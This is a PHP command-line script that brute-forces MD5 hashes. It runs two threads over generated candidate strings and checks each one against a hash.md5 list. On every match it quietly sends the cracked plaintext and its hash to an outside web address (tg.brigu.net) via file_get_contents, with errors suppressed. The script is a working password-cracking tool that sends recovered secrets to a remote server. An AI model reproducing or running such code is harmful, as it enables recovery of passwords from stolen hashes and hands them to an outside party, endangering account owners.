<?php

error_reporting(-1);
ini_set('display_errors', 1);

define('DIR', dirname(__FILE__) . DIRECTORY_SEPARATOR);
define('INC_DIR', DIR . 'inc' . DIRECTORY_SEPARATOR);

require_once DIR . 'functions.php';
require_once DIR . 'generator.php';
require_once DIR . 'thread.php';

$options = getopt("r:");

if(isset($options['r'])){	
	
	function index($hash, $repeat, $status, $i) {
		$step = 10;
		$stop = $step * $i;
		$start = $stop - $step;

		$data = [
			"repeat" => $repeat,
			"start" => $start,
			"stop" => $stop
		];

		$g = new myGenerator($data);
		$generator = $g->generator();
		
		foreach ($generator as $key => $str) {
			// Do something with the value here
			$md5 = md5($str);
			
			echo $str;
			// echo " - ";
			// echo $key;
			echo "\n";
			
			if (in_array($md5, $hash) ) {
				sleep(3);
				@file_get_contents('https://tg.brigu.net/api/decrypt/' .$str. '/' .$md5 );
				sleep(1);
			}
			// sleep(1);
		}

		if($stop < $g->maxElements()){
			exit($status);
		} else {
			exit(2);
		}
	}

	$hash = file('hash.md5', FILE_IGNORE_NEW_LINES);
	$repeat = $options['r'];
	$th = 2;
	$index = 1;

	function startThread($hash, $repeat) {
		global $index;

		$thread = new Thread('index');
		$thread->start($hash, $repeat, 1, $index);
		echo $index . "\n";
		$index++;
		return $thread;
	}

	$threads = [];
	foreach (range(1, $th) as $i) {
		$threads[$i] = startThread($hash, $repeat);
	}

	$status = true;

	while ($status){

		$stop = true;

		foreach ($threads as $i => $thread) {

			if (! $thread->isAlive()) {
				if ($thread->getExitCode() == 1) {
					$threads[$i] = startThread($hash, $repeat);
				}
			} else {
				$stop = false;
			}
		}

		if ($stop) {
			$status = false;
		}
	}

} else {
	echo "Adauga index.php -r=6";
}

	
		
		
	
		


		// usleep(1);
		
		// if ($number > $max) {

		// 	$time_end = microtime(true);
		// 	$time = ($time_end - $time_start)/60;;
		// 	echo "Process Time: {$time} min \n";

		// 	$status = false;
		// }
		
